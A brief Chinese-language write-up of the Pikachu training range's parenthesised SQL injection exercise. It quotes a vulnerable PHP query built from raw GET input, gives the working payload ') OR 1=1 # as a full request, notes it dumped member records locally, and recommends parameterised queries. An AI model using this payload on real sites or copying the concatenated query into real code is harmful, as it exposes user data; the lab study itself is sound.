Pikachu - SQL 注入 - X 型注入

分类：Web / SQL Injection · 环境：本机 Pikachu 靶场 · 题目路径：SQL-Inject → X 型注入

一、查询结构

$name = $_GET['name'];
$query = "select id,email from member where username=('$name')";

这里除了字符串引号外还有一层括号，因此 payload 的闭合位置与普通字符型注入不同。

二、验证过程

GET /pikachu/vul/sqli/sqli_x.php?name=%27)%20OR%201%3D1%20%23&submit=x

payload 为 ') OR 1=1 #。本地响应返回 1 到 7 号会员信息，说明括号和字符串均已正确闭合。

三、修复建议

不要试图通过增加括号或黑名单修补 SQL。使用参数化查询，让用户输入始终作为数据处理。
